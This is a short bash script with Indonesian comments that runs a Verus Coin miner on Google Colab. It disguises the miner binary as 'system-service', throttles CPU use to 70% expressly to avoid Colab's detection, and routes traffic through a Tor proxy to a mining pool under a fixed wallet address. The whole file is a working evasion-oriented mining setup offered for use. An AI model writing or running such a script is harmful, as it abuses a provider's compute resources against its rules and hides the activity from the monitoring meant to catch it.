#!/bin/bash
# File: start-mining.sh
# Deskripsi: Mining Verus Coin di Google Colab dengan enkripsi

# Batasi CPU ke 70% untuk hindari deteksi Colab
cpulimit -e system-service -l 70 &

# Gunakan Tor sebagai proxy (pastikan Tor sudah berjalan)
export ALL_PROXY=socks5h://127.0.0.1:9050

# Jalankan miner
./system-service -a verushash -o stratum+ssl://ap.luckpool.net:3956 -u RU1DbwVyrMKaiLdMWapCYfhiC82FijAgbw.worker -p x -t $(($(nproc --all) - 1))
